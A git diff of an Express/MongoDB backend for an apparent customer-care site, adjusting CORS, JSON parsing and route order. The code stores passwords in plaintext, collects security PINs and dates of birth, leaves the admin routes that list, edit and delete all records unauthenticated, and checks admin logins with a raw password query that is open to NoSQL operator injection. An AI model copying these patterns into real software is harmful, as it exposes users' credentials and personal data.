@@ -2,28 +2,26 @@ require("dotenv").config();
 const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
-const bodyParser = require("body-parser");
 
 const app = express();
 
 // -------------------- CORS Setup --------------------
+// ✅ Directly allow Netlify frontend and localhost for testing
 app.use(cors({
     origin: [
-        "http://localhost:5500",
-        "http://127.0.0.1:5500",
-        process.env.FRONTEND_URL
+        "https://spro-custmercare.netlify.app", // deployed frontend
+        "http://localhost:5500",                // local testing
+        "http://127.0.0.1:5500"                 // local testing
     ],
-    credentials: true
+    methods: ["GET", "POST", "PUT", "DELETE"]
 }));
 
-app.use(bodyParser.json());
+app.use(express.json()); // for parsing JSON requests
 
-// -------------------- MongoDB Connection --------------------
 // -------------------- MongoDB Connection --------------------
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("MongoDB connected successfully!"))
   .catch(err => console.log("MongoDB connection error:", err));
-
 
 // -------------------- Mongoose Schemas --------------------
 const userSchema = new mongoose.Schema({
@@ -50,7 +48,7 @@ const Admin = mongoose.model("Admin", adminSchema);
 
 // -------------------- Routes --------------------
 
-// Create user (login/register)
+// User login / signup
 app.post("/login", async (req, res) => {
     try {
         const { phone, password } = req.body;
@@ -62,7 +60,7 @@ app.post("/login", async (req, res) => {
     }
 });
 
-// Submit verification
+// Verification submission
 app.post("/verify", async (req, res) => {
     try {
         const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
@@ -74,7 +72,18 @@ app.post("/verify", async (req, res) => {
     }
 });
 
-// Get all users (admin)
+// Admin routes
+app.post("/admin-login", async (req, res) => {
+    try {
+        const { password } = req.body;
+        const admin = await Admin.findOne({ password });
+        if (!admin) return res.json({ success: false, message: "Incorrect password" });
+        res.json({ success: true, message: "Login successful" });
+    } catch (err) {
+        res.json({ success: false, message: err.message });
+    }
+});
+
 app.get("/admin/getUsers", async (req, res) => {
     try {
         const users = await User.find().sort({ createdAt: -1 });
@@ -84,7 +93,6 @@ app.get("/admin/getUsers", async (req, res) => {
     }
 });
 
-// Get all verifications (admin)
 app.get("/admin/getVerification", async (req, res) => {
     try {
         const verifications = await Verification.find().sort({ createdAt: -1 });
@@ -94,7 +102,6 @@ app.get("/admin/getVerification", async (req, res) => {
     }
 });
 
-// Update user
 app.put("/admin/updateUser/:id", async (req, res) => {
     try {
         const { phone, password } = req.body;
@@ -105,7 +112,6 @@ app.put("/admin/updateUser/:id", async (req, res) => {
     }
 });
 
-// Delete user
 app.delete("/admin/deleteUser/:id", async (req, res) => {
     try {
         await User.findByIdAndDelete(req.params.id);
@@ -115,7 +121,6 @@ app.delete("/admin/deleteUser/:id", async (req, res) => {
     }
 });
 
-// Delete verification
 app.delete("/admin/deleteVerification/:id", async (req, res) => {
     try {
         await Verification.findByIdAndDelete(req.params.id);
@@ -125,16 +130,9 @@ app.delete("/admin/deleteVerification/:id", async (req, res) => {
     }
 });
 
-// Admin login
-app.post("/admin-login", async (req, res) => {
-    try {
-        const { password } = req.body;
-        const admin = await Admin.findOne({ password });
-        if (!admin) return res.json({ success: false, message: "Incorrect password" });
-        res.json({ success: true, message: "Login successful" });
-    } catch (err) {
-        res.json({ success: false, message: err.message });
-    }
+// -------------------- Default Route --------------------
+app.get("/", (req, res) => {
+    res.send("Backend is running successfully!");
 });
 
 // -------------------- Start Server --------------------
